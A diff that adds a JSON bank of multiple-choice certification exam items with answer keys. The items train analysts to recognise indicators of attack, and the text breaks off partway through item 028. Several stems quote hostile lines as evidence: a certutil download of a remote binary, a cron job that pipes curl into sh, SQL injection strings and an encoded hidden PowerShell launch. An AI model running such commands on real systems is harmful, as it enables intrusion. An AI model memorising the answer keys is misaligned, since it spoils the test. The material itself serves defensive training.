@@ -1,0 +1,2100 @@
+[
+  {
+    "id": "cs4-1-2-mcq-001",
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "1.2"
+    ],
+    "status": "approved",
+    "type": "mcq-single",
+    "difficulty": 1,
+    "stem": "A switch reports a hardware address that is not in the asset inventory. The address was just issued a lease by the DHCP server on the finance VLAN. What does this most likely indicate?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "A routine renewal for a listed workstation"
+        },
+        {
+          "id": "b",
+          "text": "An unapproved endpoint has joined the segment"
+        },
+        {
+          "id": "c",
+          "text": "A firmware update that reset a switch port"
+        },
+        {
+          "id": "d",
+          "text": "A stale entry left over from the most recent audit"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "b"
+      ]
+    },
+    "explanation": "An address missing from the inventory that obtains a lease means something unlisted is connected, which is how a rogue device appears. A renewal for a listed workstation would match the inventory, a port reset does not create a new address, and an audit leftover would not request a fresh lease.",
+    "acronyms": [
+      "DHCP",
+      "VLAN"
+    ],
+    "searchTerm": "rogue device detection"
+  },
+  {
+    "id": "cs4-1-2-mcq-002",
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "1.2"
+    ],
+    "status": "approved",
+    "type": "mcq-single",
+    "difficulty": 1,
+    "stem": "A firewall log shows one external address sending connection attempts to ports 1 through 1024 on a single server within half a minute. Almost none completed. What activity is this?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "A load test of the web application tier"
+        },
+        {
+          "id": "b",
+          "text": "A backup job connecting to storage"
+        },
+        {
+          "id": "c",
+          "text": "A health check from the load balancer"
+        },
+        {
+          "id": "d",
+          "text": "Scanning to find open services"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "d"
+      ]
+    },
+    "explanation": "Sweeping a range of ports and abandoning most attempts is how an attacker enumerates which services are open. A load test or health check hits a few known ports and completes its sessions, and a backup job connects to one storage target.",
+    "acronyms": [],
+    "searchTerm": "port scan enumeration indicators"
+  },
+  {
+    "id": "cs4-1-2-mcq-003",
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "1.2"
+    ],
+    "status": "approved",
+    "type": "mcq-single",
+    "difficulty": 3,
+    "stem": "An analyst reviews the authentication log below. The wording differs between lines.\n\n```\n10:02:11 login failed: unknown user \"jsmith\" from 198.51.100.40\n10:02:12 login failed: unknown user \"jdoe\" from 198.51.100.40\n10:02:13 login failed: wrong password for \"bpatel\" from 198.51.100.40\n10:02:14 login failed: unknown user \"agarcia\" from 198.51.100.40\n10:02:15 login failed: wrong password for \"mchen\" from 198.51.100.40\n```\n\nWhat is the source doing, and what did it learn?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "Enumerating accounts; it learned that `bpatel` and `mchen` exist"
+        },
+        {
+          "id": "b",
+          "text": "Spraying one password; it learned that all five accounts exist"
+        },
+        {
+          "id": "c",
+          "text": "Brute-forcing one account; it learned that `bpatel` is locked"
+        },
+        {
+          "id": "d",
+          "text": "Hijacking a session; it learned that `mchen` has an open token"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "a"
+      ]
+    },
+    "explanation": "The server answers differently for names that do not exist and names that do, so the source is probing for valid usernames and has confirmed two. Spraying and brute force would show repeated password guesses rather than one try per name, and the log shows no lockout or session token.",
+    "acronyms": [],
+    "searchTerm": "account enumeration login errors"
+  },
+  {
+    "id": "cs4-1-2-mcq-004",
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "1.2"
+    ],
+    "status": "approved",
+    "type": "mcq-single",
+    "difficulty": 2,
+    "stem": "Proxy logs show a workstation connecting to 203.0.113.50 every 300 seconds, around the clock. Each exchange sends 212 bytes and receives 48 bytes, and the destination domain was registered last week. Which interpretation fits best?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "A browser tab refreshing a news page each minute"
+        },
+        {
+          "id": "b",
+          "text": "A time synchronization client polling"
+        },
+        {
+          "id": "c",
+          "text": "Beaconing to a command-and-control server"
+        },
+        {
+          "id": "d",
+          "text": "A mail client checking for new messages"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "c"
+      ]
+    },
+    "explanation": "A fixed interval, identical sizes and a brand-new destination domain are the pattern of malware checking in with its controller. A refreshing tab or mail client varies in size and uses long-established destinations, and time synchronization uses a different protocol and well-known servers.",
+    "acronyms": [],
+    "searchTerm": "beaconing command and control indicators"
+  },
+  {
+    "id": "cs4-1-2-mcq-005",
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "1.2"
+    ],
+    "status": "approved",
+    "type": "mcq-single",
+    "difficulty": 2,
+    "stem": "A database server holds an established outbound TCP session to 198.51.100.77 on port 6667. The firewall policy does not allow that port for the server. What is the best interpretation?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "Normal replication traffic to the standby database server"
+        },
+        {
+          "id": "b",
+          "text": "A monitoring agent reporting to the SIEM"
+        },
+        {
+          "id": "c",
+          "text": "A remote control channel on a nonstandard port"
+        },
+        {
+          "id": "d",
+          "text": "Routine name resolution for the host"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "c"
+      ]
+    },
+    "explanation": "An outbound session on a port the policy never permits, from a server that should only answer clients, is a classic sign of a hidden control channel. Replication and agent reporting use approved ports and destinations, and name resolution uses DNS rather than a long TCP session.",
+    "acronyms": [
+      "SIEM",
+      "DNS",
+      "TCP"
+    ],
+    "searchTerm": "unexpected port outbound connection"
+  },
+  {
+    "id": "cs4-1-2-mcq-006",
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "1.2"
+    ],
+    "status": "approved",
+    "type": "mcq-single",
+    "difficulty": 2,
+    "stem": "A build server has stayed near 95 percent CPU overnight with no jobs queued. The busiest process is an unfamiliar binary in `/tmp`, and traffic to a pool address has started. What is the likely cause?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "A hidden cryptocurrency miner"
+        },
+        {
+          "id": "b",
+          "text": "A runaway compiler left from a failed job"
+        },
+        {
+          "id": "c",
+          "text": "A scheduled antivirus full scan"
+        },
+        {
+          "id": "d",
+          "text": "A memory leak in the logging service"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "a"
+      ]
+    },
+    "explanation": "Sustained processor use by an unknown binary that also contacts a mining pool is the signature of mining software. A leftover compiler would be a known process, antivirus scans are scheduled and use a known engine, and a memory leak raises memory rather than processor load.",
+    "acronyms": [
+      "CPU"
+    ],
+    "searchTerm": "resource consumption cryptomining"
+  },
+  {
+    "id": "cs4-1-2-mcq-007",
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "1.2"
+    ],
+    "status": "approved",
+    "type": "mcq-single",
+    "difficulty": 1,
+    "stem": "An EDR report shows a remote-access utility installed on an accounting laptop. It is not on the approved list and no ticket exists. Why is this an indicator of malicious activity?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "It will stop working once the license period ends for the year"
+        },
+        {
+          "id": "b",
+          "text": "It voids the vendor warranty on the hardware"
+        },
+        {
+          "id": "c",
+          "text": "It increases the size of the weekly backup"
+        },
+        {
+          "id": "d",
+          "text": "It can give an outside party hands-on control of the host"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "d"
+      ]
+    },
+    "explanation": "Unapproved software that offers remote control is a common way for an outsider to keep access to a machine. License expiry, warranty terms and backup size are administrative side effects, not signs of malicious activity.",
+    "acronyms": [
+      "EDR"
+    ],
+    "searchTerm": "unauthorized software indicator"
+  },
+  {
+    "id": "cs4-1-2-mcq-008",
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "1.2"
+    ],
+    "status": "approved",
+    "type": "mcq-single",
+    "difficulty": 2,
+    "stem": "An EDR process tree for a sales workstation is shown. What does it most likely indicate?\n\n```\nwinword.exe (PID 4120)\n  powershell.exe -nop -w hidden -enc SQBFAFgA...\n    rundll32.exe (outbound 203.0.113.9:443)\n```",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "A macro that formats a letter template"
+        },
+        {
+          "id": "b",
+          "text": "A malicious document launching a concealed script"
+        },
+        {
+          "id": "c",
+          "text": "An administrator running a maintenance task"
+        },
+        {
+          "id": "d",
+          "text": "A print spooler restart after a routine driver update"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "b"
+      ]
+    },
+    "explanation": "An office application that spawns a hidden, encoded shell which then makes an outbound connection is typical of a booby-trapped document. A formatting macro would not start a shell, maintenance runs from admin tools rather than a document, and a spooler restart has a different parent and no network call.",
+    "acronyms": [
+      "EDR"
+    ],
+    "searchTerm": "suspicious process parent child"
+  },
+  {
+    "id": "cs4-1-2-mcq-009",
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "1.2"
+    ],
+    "status": "approved",
+    "type": "mcq-single",
+    "difficulty": 3,
+    "stem": "An EDR alert shows the command below, run by a standard user. The application allowlist did not block it. Why?\n\n```\ncertutil.exe -urlcache -split -f http://203.0.113.9/a.bin %TEMP%\\a.exe\n```",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "The utility is a trusted OS component, so the allowlist treats it as approved"
+        },
+        {
+          "id": "b",
+          "text": "Standard users are exempt from application allowlists on this workstation"
+        },
+        {
+          "id": "c",
+          "text": "The alert fired after the downloaded file had already been deleted"
+        },
+        {
+          "id": "d",
+          "text": "Allowlists only inspect files saved on network shares or removable drives"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "a"
+      ]
+    },
+    "explanation": "This is living off the land: attackers abuse a signed, built-in binary that the allowlist already trusts, so the download looks like normal tool use. Allowlists apply to standard users, the file was just fetched rather than deleted, and local execution is inspected too.",
+    "acronyms": [
+      "EDR",
+      "OS"
+    ],
+    "searchTerm": "living off the land binaries"
+  },
+  {
+    "id": "cs4-1-2-mcq-010",
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "1.2"
+    ],
+    "status": "approved",
+    "type": "mcq-single",
+    "difficulty": 1,
+    "stem": "Within four minutes, a file server shows thousands of documents renamed with the same unfamiliar extension, and a text file with payment instructions appears in every folder. What file system pattern is this?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "A scheduled job archiving old files"
+        },
+        {
+          "id": "b",
+          "text": "A permissions inheritance change on the share"
+        },
+        {
+          "id": "c",
+          "text": "Mass encryption of files by ransomware"
+        },
+        {
+          "id": "d",
+          "text": "A disk defragmentation pass on the volume"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "c"
+      ]
+    },
+    "explanation": "Rapid renaming with a new extension plus ransom notes in each folder is the footprint of ransomware encrypting data. Archiving would compress files into fewer containers, an inheritance change alters access but not file names, and defragmentation never renames content.",
+    "acronyms": [],
+    "searchTerm": "file system changes ransomware"
+  },
+  {
+    "id": "cs4-1-2-mcq-011",
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "1.2"
+    ],
+    "status": "approved",
+    "type": "mcq-single",
+    "difficulty": 3,
+    "stem": "A file integrity monitor on a web server reports the lines below. What do they indicate, and what should the analyst do first?\n\n```\n02:14:09 created /etc/cron.d/sysupd owner=www-data\n02:14:09 content: * * * * * www-data curl -s http://198.51.100.8/x | sh\n```",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "A vendor patch job scheduled for the maintenance window; no action is needed"
+        },
+        {
+          "id": "b",
+          "text": "A log rotation entry created by the system; add it to the monitor baseline"
+        },
+        {
+          "id": "c",
+          "text": "A failed deployment of the site content; roll back the site and restore the last release"
+        },
+        {
+          "id": "d",
+          "text": "Persistence set through the web account; preserve evidence and contain the host"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "d"
+      ]
+    },
+    "explanation": "A new scheduled job owned by the web service account that fetches and runs remote content is persistence planted by an intruder, so evidence is preserved and the host contained. Vendor patching and log rotation do not pipe remote downloads into a shell, and a rollback would leave the job in place.",
+    "acronyms": [],
+    "searchTerm": "file integrity monitoring persistence cron"
+  },
+  {
+    "id": "cs4-1-2-mcq-012",
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "1.2"
+    ],
+    "status": "approved",
+    "type": "mcq-single",
+    "difficulty": 2,
+    "stem": "A DLP alert shows one analyst laptop uploaded 4 gigabytes to a personal cloud storage site at 23:10. The user normally uploads about 20 megabytes a day. What is the best interpretation?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "An operating system update pulled from the vendor"
+        },
+        {
+          "id": "b",
+          "text": "Probable exfiltration to an outside site"
+        },
+        {
+          "id": "c",
+          "text": "A nightly backup to the corporate vault server"
+        },
+        {
+          "id": "d",
+          "text": "A video call recording saved to the local disk"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "b"
+      ]
+    },
+    "explanation": "A large, out-of-pattern upload to a personal destination after hours is a strong exfiltration indicator that needs review of what was sent. An update is a download, the approved backup goes to the corporate vault, and a local recording would not leave the laptop.",
+    "acronyms": [
+      "DLP"
+    ],
+    "searchTerm": "data exfiltration indicators DLP"
+  },
+  {
+    "id": "cs4-1-2-mcq-013",
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "1.2"
+    ],
+    "status": "approved",
+    "type": "mcq-single",
+    "difficulty": 2,
+    "stem": "At 01:40, outside any change window, a perimeter rule is added that lets any source reach TCP 3389 on the server subnet. The change system has no matching ticket. How should the analyst treat this?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "As an unauthorized configuration that exposes remote access"
+        },
+        {
+          "id": "b",
+          "text": "As an early hardening step done ahead of schedule"
+        },
+        {
+          "id": "c",
+          "text": "As a false positive because rules are often added after hours"
+        },
+        {
+          "id": "d",
+          "text": "As a rule that expires when the change window closes"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "a"
+      ]
+    },
+    "explanation": "A rule opening remote desktop to every source, made with no approved ticket, is an unauthorized configuration change and an exposure to investigate. Hardening would close access rather than open it, after-hours timing does not excuse a missing ticket, and nothing in the log shows an expiry.",
+    "acronyms": [
+      "TCP"
+    ],
+    "searchTerm": "unauthorized configuration change firewall"
+  },
+  {
+    "id": "cs4-1-2-mcq-014",
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "1.2"
+    ],
+    "status": "approved",
+    "type": "mcq-single",
+    "difficulty": 2,
+    "stem": "On a server, the audit policy was changed so that logon and process-creation events are no longer recorded. The change came from a service account shortly after an unusual login. Which interpretation fits?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "An approved reduction in audit logging last quarter"
+        },
+        {
+          "id": "b",
+          "text": "A default setting restored by a routine operating system update"
+        },
+        {
+          "id": "c",
+          "text": "Defense evasion through an unauthorized configuration change"
+        },
+        {
+          "id": "d",
+          "text": "A SIEM connector fault that drops the events"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "c"
+      ]
+    },
+    "explanation": "Turning off auditing right after suspicious access is an attempt to hide later activity. An approved reduction would have a ticket and a different actor, an update would not be triggered by a service account, and a connector fault would not change the policy on the server.",
+    "acronyms": [
+      "SIEM"
+    ],
+    "searchTerm": "defense evasion audit policy change"
+  },
+  {
+    "id": "cs4-1-2-mcq-015",
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "1.2"
+    ],
+    "status": "approved",
+    "type": "mcq-single",
+    "difficulty": 1,
+    "stem": "A public web application starts returning errors. The load balancer shows tens of thousands of requests per second from thousands of different addresses, all asking for the home page. What is happening?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "A cache warm-up after a normal deployment"
+        },
+        {
+          "id": "b",
+          "text": "A distributed flood is exhausting the service"
+        },
+        {
+          "id": "c",
+          "text": "A certificate renewal interrupting HTTPS briefly"
+        },
+        {
+          "id": "d",
+          "text": "A database backup that locks the tables"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "b"
+      ]
+    },
+    "explanation": "A huge request rate from many sources aimed at one page is a distributed denial of service against the application. Cache warm-up comes from internal hosts, a renewal affects handshakes rather than request volume, and a backup lock would not produce external traffic.",
+    "acronyms": [
+      "HTTPS"
+    ],
+    "searchTerm": "application service disruption flood"
+  },
+  {
+    "id": "cs4-1-2-mcq-016",
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "1.2"
+    ],
+    "status": "approved",
+    "type": "mcq-single",
+    "difficulty": 2,
+    "stem": "Which attack do these web server log lines indicate?\n\n```\n203.0.113.61 GET /items?id=7' OR '1'='1 HTTP/1.1 200 5120\n203.0.113.61 GET /items?id=7' UNION SELECT user,pass FROM admin-- 200 9087\n```",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "Cross-site scripting through a comment field"
+        },
+        {
+          "id": "b",
+          "text": "Directory traversal outside the web root"
+        },
+        {
+          "id": "c",
+          "text": "Cache poisoning of the item pages"
+        },
+        {
+          "id": "d",
+          "text": "SQL injection of the `id` value"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "d"
+      ]
+    },
+    "explanation": "Quote characters and clauses such as OR and UNION in a parameter are attempts to change a database query, and the growing response size suggests data came back. The lines carry no script tags, no path traversal sequences and no cache-related headers.",
+    "acronyms": [
+      "SQL"
+    ],
+    "searchTerm": "SQL injection web log indicators"
+  },
+  {
+    "id": "cs4-1-2-mcq-017",
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "1.2"
+    ],
+    "status": "approved",
+    "type": "mcq-single",
+    "difficulty": 3,
+    "stem": "An identity provider log shows 6,000 failed sign-ins over two hours across 3,000 accounts, with exactly two attempts per account and one repeated password pattern. Which attack is this, and why does it fit?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "Brute force: many guesses per account until one works"
+        },
+        {
+          "id": "b",
+          "text": "Credential stuffing: each account gets its own leaked password"
+        },
+        {
+          "id": "c",
+          "text": "Password spraying: few guesses per account stay under lockout limits"
+        },
+        {
+          "id": "d",
+          "text": "Session fixation: a token is set before sign-in"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "c"
+      ]
+    },
+    "explanation": "One common password tried a couple of times against many accounts is spraying, designed to avoid lockout thresholds. Brute force would hammer single accounts, credential stuffing would use different leaked passwords per account, and fixation involves sessions rather than failed logins.",
+    "acronyms": [],
+    "searchTerm": "password spraying indicators"
+  },
+  {
+    "id": "cs4-1-2-mcq-018",
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "1.2"
+    ],
+    "status": "approved",
+    "type": "mcq-single",
+    "difficulty": 2,
+    "stem": "Cloud audit logs show a developer access key launching 40 large compute instances in a region the company has never used, at 04:00. What is the best description?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "Resource compromise using stolen or leaked credentials"
+        },
+        {
+          "id": "b",
+          "text": "Autoscaling reacting to a planned product launch"
+        },
+        {
+          "id": "c",
+          "text": "A recovery drill listed on the change calendar"
+        },
+        {
+          "id": "d",
+          "text": "A billing report miscalculating regional usage this month"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "a"
+      ]
+    },
+    "explanation": "Large new compute in an unused region from a developer key at night points to a stolen key being used to run attacker workloads. Autoscaling and drills would be planned and in approved regions, and a billing report only reports usage and creates no instances.",
+    "acronyms": [],
+    "searchTerm": "cloud resource compromise access key"
+  },
+  {
+    "id": "cs4-1-2-mcq-019",
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "1.2"
+    ],
+    "status": "approved",
+    "type": "mcq-single",
+    "difficulty": 3,
+    "stem": "A storage bucket policy changed from private to public read at 14:05. Ten minutes later, the access log shows 900 objects downloaded from 192.0.2.88. Which action should the analyst take first?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "Delete the bucket so nothing else can leak"
+        },
+        {
+          "id": "b",
+          "text": "Restore the original policy and preserve the access logs"
+        },
+        {
+          "id": "c",
+          "text": "Rotate every key in the organization before looking further"
+        },
+        {
+          "id": "d",
+          "text": "Wait for the daily report to confirm the pattern"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "b"
+      ]
+    },
+    "explanation": "Closing the exposure while keeping the logs stops further loss and preserves the evidence needed to scope it. Deleting the bucket destroys evidence and data, an organization-wide rotation is slow and unfocused, and waiting lets the downloads continue.",
+    "acronyms": [],
+    "searchTerm": "cloud storage public access anomaly"
+  },
+  {
+    "id": "cs4-1-2-mcq-020",
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "1.2"
+    ],
+    "status": "approved",
+    "type": "mcq-single",
+    "difficulty": 1,
+    "stem": "Staff receive an email linking to `northwlnd-cu.example`, while the real site is `northwind-cu.example`. What technique does the lookalike domain represent?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "Domain shadowing"
+        },
+        {
+          "id": "b",
+          "text": "Cache poisoning"
+        },
+        {
+          "id": "c",
+          "text": "Session hijacking"
+        },
+        {
+          "id": "d",
+          "text": "Typosquatting"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "d"
+      ]
+    },
+    "explanation": "A domain that swaps one character for a similar-looking one to catch careless typing or reading is typosquatting. Shadowing adds malicious subdomains under a real domain, cache poisoning corrupts resolver answers, and hijacking steals an existing session.",
+    "acronyms": [],
+    "searchTerm": "typosquatting lookalike domain"
+  },
+  {
+    "id": "cs4-1-2-mcq-021",
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "1.2"
+    ],
+    "status": "approved",
+    "type": "mcq-single",
+    "difficulty": 1,
+    "stem": "A message tells staff to confirm a delivery by opening a shortened link. Why do analysts treat unexpected shortened links with caution?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "The short form hides the true destination from the reader"
+        },
+        {
+          "id": "b",
+          "text": "Shortened links expire before a user can open them"
+        },
+        {
+          "id": "c",
+          "text": "Mail gateways rarely scan or expand links that are shortened"
+        },
+        {
+          "id": "d",
+          "text": "Short links run on a different port than normal ones"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "a"
+      ]
+    },
+    "explanation": "A shortener replaces the visible address, so the reader cannot judge where the click leads, which helps phishing. The other statements are untrue: short links stay valid, gateways can expand and scan them, and they use the same ports as ordinary web links.",
+    "acronyms": [],
+    "searchTerm": "URL shortener phishing risk"
+  },
+  {
+    "id": "cs4-1-2-mcq-022",
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "1.2"
+    ],
+    "status": "approved",
+    "type": "mcq-single",
+    "difficulty": 2,
+    "stem": "The identity provider log below shows what happened to one account.\n\n```\n03:12 MFA push sent to rlopez - denied\n03:13 MFA push sent to rlopez - denied\n03:14 MFA push sent to rlopez - denied\n03:21 MFA push sent to rlopez - approved\n03:22 sign-in success rlopez from 203.0.113.140\n```\n\nWhat does this sequence suggest?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "A faulty token that fires a prompt every few minutes"
+        },
+        {
+          "id": "b",
+          "text": "An expired password that forces repeated reauthentication"
+        },
+        {
+          "id": "c",
+          "text": "MFA fatigue, where the user gave in to repeated prompts"
+        },
+        {
+          "id": "d",
+          "text": "A user switching between two phones during travel"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "c"
+      ]
+    },
+    "explanation": "Repeated prompts in the middle of the night, followed by an approval and a sign-in from an unfamiliar address, show an attacker with the password wearing down the user. A faulty token would keep firing, an expired password prompts a reset rather than pushes, and phone switching does not need denials.",
+    "acronyms": [
+      "MFA"
+    ],
+    "searchTerm": "MFA fatigue account compromise"
+  },
+  {
+    "id": "cs4-1-2-mcq-023",
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "1.2"
+    ],
+    "status": "approved",
+    "type": "mcq-single",
+    "difficulty": 3,
+    "stem": "A service account that runs a nightly backup, and has never signed in interactively, shows a remote desktop logon at 22:40 from an unfamiliar workstation. What does this most likely mean?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "The backup vendor is doing routine remote maintenance"
+        },
+        {
+          "id": "b",
+          "text": "Stolen credentials are being used by someone else"
+        },
+        {
+          "id": "c",
+          "text": "Service accounts can sign in anywhere as designed"
+        },
+        {
+          "id": "d",
+          "text": "A cached credential refreshed after a scheduled password rotation"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "b"
+      ]
+    },
+    "explanation": "An account with no history of interactive use that suddenly opens a remote session from a new host is unauthorized access with likely stolen credentials. Vendor maintenance would be arranged and ticketed, service accounts should be restricted rather than free to sign in anywhere, and a cached refresh makes no new remote session.",
+    "acronyms": [],
+    "searchTerm": "unauthorized access service account misuse"
+  },
+  {
+    "id": "cs4-1-2-mcq-024",
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "1.2"
+    ],
+    "status": "approved",
+    "type": "mcq-single",
+    "difficulty": 3,
+    "stem": "An impossible-travel alert fires for a user who signed in from the head office and then from another country 12 minutes later. The second source address belongs to a commercial VPN provider. What is the best next step?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "Verify with the user and check device and MFA details before deciding"
+        },
+        {
+          "id": "b",
+          "text": "Close the alert because VPN exit points often explain the pattern"
+        },
+        {
+          "id": "c",
+          "text": "Disable the account and wipe the head-office workstation right away"
+        },
+        {
+          "id": "d",
+          "text": "Block the whole country at the perimeter for all staff at once"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "a"
+      ]
+    },
+    "explanation": "A VPN is a plausible benign cause but also a way for attackers to mask their location, so the analyst confirms with the user and checks the device and MFA evidence. Closing the alert on assumption, wiping a workstation, or blocking a country are either premature or out of proportion.",
+    "acronyms": [
+      "MFA",
+      "VPN"
+    ],
+    "searchTerm": "impossible travel alert triage"
+  },
+  {
+    "id": "cs4-1-2-mcq-025",
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "1.2"
+    ],
+    "status": "approved",
+    "type": "mcq-single",
+    "difficulty": 2,
+    "stem": "Accounts payable receives a message from an executive's display name asking to change a vendor's bank details before a payment run. The reply-to address is on a free mail domain. What type of attack is this?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "Ransomware delivered through a macro-enabled attachment"
+        },
+        {
+          "id": "b",
+          "text": "A watering hole attack on the vendor portal"
+        },
+        {
+          "id": "c",
+          "text": "Vishing aimed at the help desk"
+        },
+        {
+          "id": "d",
+          "text": "Business email compromise using an impersonated sender"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "d"
+      ]
+    },
+    "explanation": "An urgent payment change request that appears to come from an executive, with a mismatched reply-to address, is business email compromise. The message has no attachment, no compromised website, and no phone call, so the other three do not fit.",
+    "acronyms": [],
+    "searchTerm": "business email compromise indicators"
+  },
+  {
+    "id": "cs4-1-2-mcq-026",
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "1.2"
+    ],
+    "status": "approved",
+    "type": "mcq-single",
+    "difficulty": 3,
+    "stem": "A finance manager signed in from a new country last night. Which finding best supports a business email compromise investigation of that mailbox?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "A spike in newsletter messages to the mailbox"
+        },
+        {
+          "id": "b",
+          "text": "A new signature template applied by the help desk team last week"
+        },
+        {
+          "id": "c",
+          "text": "A new rule forwarding invoice mail to an outside address"
+        },
+        {
+          "id": "d",
+          "text": "A calendar invitation from a known vendor"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "c"
+      ]
+    },
+    "explanation": "A hidden forwarding rule on invoice messages lets an attacker watch and redirect payments, and it follows the suspicious sign-in. A newsletter spike, a help desk signature change and a vendor invitation are ordinary activity with no link to the sign-in.",
+    "acronyms": [],
+    "searchTerm": "mailbox forwarding rule BEC"
+  },
+  {
+    "id": "cs4-1-2-mcq-027",
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "1.2"
+    ],
+    "status": "approved",
+    "type": "mcq-single",
+    "difficulty": 2,
+    "stem": "An EDR lists two processes on a workstation: `svchost.exe` under `services.exe` in `C:\\Windows\\System32`, and `svch0st.exe` under `explorer.exe` in `C:\\Users\\Public`. Which is suspicious, and why?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "The first; it is a system process name that appears in the System32 folder"
+        },
+        {
+          "id": "b",
+          "text": "The second; its name imitates a system process but runs from a user-writable path"
+        },
+        {
+          "id": "c",
+          "text": "Both; two similar process names on one host indicate a duplicate install of the service"
+        },
+        {
+          "id": "d",
+          "text": "Neither; the second is just an older build of the first from a prior update"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "b"
+      ]
+    },
+    "explanation": "A near-identical name, a digit in place of a letter, and a launch from a public user folder are masquerading techniques. The first entry is where the genuine process should be, a duplicate install would not use a zero for an o, and an older build would not live in a public folder.",
+    "acronyms": [
+      "EDR"
+    ],
+    "searchTerm": "masquerading process name"
+  },
+  {
+    "id": "cs4-1-2-mcq-028",
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "1.2"
+    ],
+    "status": "approved",
+    "type": "mcq-multi",
+    "difficulty": 2,
+    "stem": "Which TWO observations suggest an internal host is enumerating the network?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "One workstation sending echo requests to every address in `10.20.30.0/24`"
+        },
+        {
+          "id": "b",
+          "text": "One workstation requesting share lists from dozens of file servers over SMB in a minute"
+        },
+        {
+          "id": "c",
+          "text": "A file server answering many clients that request the same shared folder all day"
+        },
+        {
+          "id": "d",
+          "text": "A domain controller replicating directory data with its partner on a schedule"
+        },
+        {
+          "id": "e",
